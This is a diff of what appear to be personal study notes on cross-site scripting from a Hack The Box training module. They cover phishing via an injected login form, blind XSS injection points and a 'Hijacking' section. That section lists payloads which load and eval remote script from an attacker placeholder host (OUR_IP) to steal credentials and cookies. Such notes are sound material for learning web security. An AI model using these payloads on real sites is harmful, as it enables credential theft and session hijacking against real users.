@@ -283,7 +283,7 @@ Four main elements to change
 - Page Text `DOM.innerHTML`
 
 **Phishing**
-These work best with `Stored XSS` attacks. One basic example is injecting a form into a webpage that is stored, so that we can steal credentials.
+These can either be stored XSS or reflected/DOM. If it isn't stored, you may be able to use XSS in the URL and send a malicious link.  One basic example is injecting a form into a webpage URL, so that we can steal credentials.
 ```html
 <h3>Please login to continue</h3>
 <form action=http://OUR_IP>
@@ -305,6 +305,7 @@ To connect to the listener
 sudo nc -lvnp 80
 ```
 The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):
+
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
@@ -324,9 +325,46 @@ Enigma3nma@htb[/htb]$ vi index.php #at this step we wrote our index.php file
 Enigma3nma@htb[/htb]$ sudo php -S 0.0.0.0:80
 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
+**Blind XSS**
+*It can't see you either*
+Look for these in:
+- Contact Forms
+- Reviews
+- User Details
+- Support Tickets
+- HTTP User-Agent header
 
-![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]
 **Hijacking**
+*Perform a cookie robbery. Commit identity fraud. Usual days work.*
+
+To send a file:
+```
+<script src="http://OUR_IP/script.js"></script>
+```
+You can change `script.js` to a field/object we are injecting it into and call it like this ``
+```
+<script src="http://OUR_IP/<field>"></script>
+```
+Then if you get a request for `/username` you know it is injectable.
+Here are a few payloads you can try (from PayloadsAllTheThings)
+```
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+
+
+
+
+
+
+`
+![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]
+
 
 
 
